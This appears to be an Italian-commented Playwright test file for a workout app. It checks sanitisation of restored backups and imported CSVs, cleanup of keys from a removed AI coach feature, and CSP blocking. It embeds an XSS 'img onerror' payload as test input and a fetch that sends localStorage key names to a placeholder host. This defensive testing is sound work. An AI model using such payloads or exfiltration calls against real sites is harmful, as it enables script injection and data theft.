/* Prove di sicurezza: file manomessi (backup, CSV), nomi con caratteri speciali, CSP, consensi, chiavi orfane del vecchio Coach IA */
const { chromium } = require('playwright-core');
const ok=(c,m)=>{console.log((c?'  ok: ':'  FALLITO: ')+m); if(!c) process.exitCode=1;};
(async()=>{
const b=await chromium.launch({executablePath:process.env.CHROMIUM||'/opt/pw-browsers/chromium'});
const p=await (await b.newContext({viewport:{width:390,height:844},serviceWorkers:'block'})).newPage(); const errs=[]; p.on('pageerror',e=>errs.push(e.message));
await p.addInitScript(()=>{localStorage.setItem('tz_mode','toji');localStorage.setItem('tz_consenso','no');localStorage.setItem('tz_onb','1');localStorage.setItem('tz_guida_vista','1'); localStorage.setItem('tz_consenso_ia','si');localStorage.setItem('tz_consenso_ia_data','01/09/2026');localStorage.setItem('tz_device_ia','vecchio-codice');localStorage.setItem('tz_ia_uso','{"usati":3,"limite":20,"mese":"2026-09"}'); window.__hit={}; window.__x=(k)=>{window.__hit[k]=1;}; });
await p.goto(require('url').pathToFileURL(require('path').join(__dirname,'..','..','index.html')).href);await p.waitForTimeout(800);

console.log('0) chiavi del vecchio Coach IA (rimosso): ripulite all\'avvio');
const r0=await p.evaluate(()=>({ ia:['tz_consenso_ia','tz_consenso_ia_data','tz_device_ia','tz_ia_uso'].map(k=>localStorage.getItem(k)), consenso:localStorage.getItem('tz_consenso') }));
ok(r0.ia.every(v=>v===null),'le chiavi del vecchio Coach IA seminate prima dell avvio sono sparite: '+JSON.stringify(r0.ia));
ok(r0.consenso==='no','la pulizia non tocca il consenso generale');

console.log('1) backup manomesso (o vecchio, con le chiavi del Coach IA)');
const r1=await p.evaluate(()=>{
  const pl=(k)=>`"><img src=x alt=${k} onerror=__x(this.alt)>`;
  const g=DAYS[0]; const d={}; DAYS.forEach(x=>d[x]=[]);
  d[g]=[{name:pl('backup-nome'),sets:2,reps:8,weight:20,rest:90,completedSets:[]}];
  const dati={}; dati['coach_plus_data_toji']=JSON.stringify(d); dati['coach_plus_titles_toji']=JSON.stringify({[g]:pl('backup-titolo')});
  dati['tz_consenso']='si'; dati['tz_consenso_data']='01/01/2026'; dati['tz_consenso_versione']='9.9'; dati['tz_consenso_ia']='si'; dati['tz_consenso_ia_data']='01/09/2026'; dati['tz_device_ia']='scelto-da-chi-attacca'; dati['tz_ia_uso']='{"usati":0,"limite":999,"mese":"2026-10"}';
  applicaFotografia(dati,false);
  ['plan','workout','oggi'].forEach(t=>switchTab(t));
  return { nome:loadData()[g][0].name, consenso:localStorage.getItem('tz_consenso'), extra:['tz_consenso_data','tz_consenso_versione'].map(k=>localStorage.getItem(k)), ia:['tz_consenso_ia','tz_consenso_ia_data','tz_device_ia','tz_ia_uso'].map(k=>localStorage.getItem(k)), img:document.querySelectorAll('img[src=x]').length };
});
ok(!/[<>]/.test(r1.nome),'nel nome ripristinato non restano < e >');
ok(r1.img===0,'nessun elemento iniettato nelle schermate');
ok(r1.consenso==='no'&&r1.extra.every(v=>v===null),'nessuna chiave di consenso (ne data, ne versione) passa da un backup: il consenso generale non si ripristina mai');
ok(r1.ia.every(v=>v===null),'un backup vecchio non rimette le chiavi del Coach IA rimosso (consenso, data, codice dispositivo, contatore): '+JSON.stringify(r1.ia));

console.log('2) importazione da file di un\'altra app');
const r2=await p.evaluate(()=>{
  const pl=(k)=>`"><img src=x alt=${k} onerror=__x(this.alt)>`;
  const csv='Date,Workout Name,Exercise Name,Set Order,Weight,Reps\n2026-09-01 10:00:00,"'+pl('csv-titolo').replace(/"/g,'""')+'","'+pl('csv-nome').replace(/"/g,'""')+'",1,50,8\n';
  const r=leggiExport(csv); const h=sedutaImportata(r.sedute[0],'Prova');
  return { nome:h.sessione[0].name, titolo:h.titolo };
});
ok(!/[<>"]/.test(r2.nome+r2.titolo),'nome e titolo importati senza < > "  ('+r2.nome+')');

console.log('3) nomi con apici e virgolette nei pulsanti');
const r3=await p.evaluate(()=>{
  const nome='Curl "bar\' \\ prova'; window.__aperto=null; window.openExerciseInfo=function(n){ window.__aperto=n; };
  const d={}; DAYS.forEach(x=>d[x]=[]); d[DAYS[0]]=[{name:nome,sets:2,reps:8,weight:20,rest:90,completedSets:[]}]; saveData(d);
  currentDay=DAYS[0]; renderAllenamento&&renderAllenamento(); switchTab('workout');
  const bt=document.querySelector('.info-btn'); if(bt) bt.click();
  return { atteso:nome, aperto:window.__aperto, htmlOk:!!bt };
});
ok(r3.htmlOk&&r3.aperto===r3.atteso,'il pulsante passa il nome intatto: '+JSON.stringify(r3.aperto));

console.log('4) politica CSP');
const r4=await p.evaluate(async()=>{ let violata=false; document.addEventListener('securitypolicyviolation',()=>{violata=true;}); try{ await fetch('https://esempio.example.com/?x='+encodeURIComponent(JSON.stringify(Object.keys(localStorage)))); }catch(e){} await new Promise(r=>setTimeout(r,200)); return violata?'bloccata':'passata'; });
ok(r4==='bloccata','una richiesta verso un sito non previsto viene bloccata dalla CSP');
ok(await p.evaluate(()=>!!document.querySelector('meta[http-equiv="Content-Security-Policy"]')),'la politica CSP e presente');
ok(errs.length===0,'nessun errore di pagina '+errs.join('|'));
await b.close();
})();
